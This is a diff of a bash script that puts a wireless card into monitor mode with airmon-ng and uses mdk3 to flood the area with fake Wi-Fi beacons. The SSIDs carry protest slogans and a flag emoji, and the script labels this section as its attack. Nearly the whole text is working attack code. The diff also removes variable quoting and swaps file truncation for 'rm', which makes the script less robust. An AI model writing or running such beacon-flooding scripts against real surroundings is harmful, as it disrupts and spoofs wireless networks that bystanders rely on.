@@ -1,14 +1,14 @@
 #!/bin/bash
 
 # --- Checks ---
-if [ -z "$1" ]; then
+if [ -z $1 ]; then
     echo "Error: The interface name is missing. Please provide it in the configuration file."
     exit 1
 fi
 
 # --- Variables ---
 INTERFACE=$1
-MDK3_CONF_FILE="/tmp/mdk3_beacon_ssid.txt"
+MDK3_CONF_FILE=/tmp/mdk3_beacon_ssid.txt
 EMOJI="🇵🇸"
 PHRASES=(
     "FERMATE IL GENOCIDIO"
@@ -48,12 +48,12 @@ NUM_PHRASES=${#PHRASES[@]}
 airmon-ng check kill
 airmon-ng start ${INTERFACE}
 
-> "$MDK3_CONF_FILE"
+rm $MDK3_CONF_FILE
 
 # -- Attack ---
 for phrase in "${PHRASES[@]}"; do
     FULL_SSID="${phrase} ${EMOJI}"
-    echo "$FULL_SSID" >> "$MDK3_CONF_FILE"
+    echo $FULL_SSID >> $MDK3_CONF_FILE
 done
 
-mdk3 "$INTERFACE" b -f "$MDK3_CONF_FILE" -a -g -m
+mdk3 $INTERFACE b -f $MDK3_CONF_FILE -a -g -m
